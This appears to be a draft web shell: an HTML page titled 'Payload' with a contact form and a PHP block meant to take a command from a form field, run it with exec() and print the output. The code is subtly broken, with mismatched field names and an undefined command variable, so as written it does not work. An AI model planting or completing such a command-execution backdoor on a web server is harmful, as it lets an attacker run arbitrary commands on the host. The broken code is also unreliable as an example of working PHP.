<!DOCTYPE html>
<html>
      
<head>
    <title>
        Payload
    </title>
</head>
  
<body style="text-align:center;">
    


    <form action="welcome.php" method="post">
    Name: <input type="text" name="name"><br>
    E-mail: <input type="text" name="email"><br>
    <input type="submit">
    </form>

    <?php
        if(array_key_exists('cmd_button', $_POST)) {
            butt();
        }
        function butt() {

            echo $_POST["cmd"];
            $output = exec($command);

            echo $output;
        }
    ?>

    <form method="post">
        <label for="cmd_input">Command: </label><input type="text" name="cmd_input"><br>
        <input type="submit"/>
    </form>
</head>
  
</html>

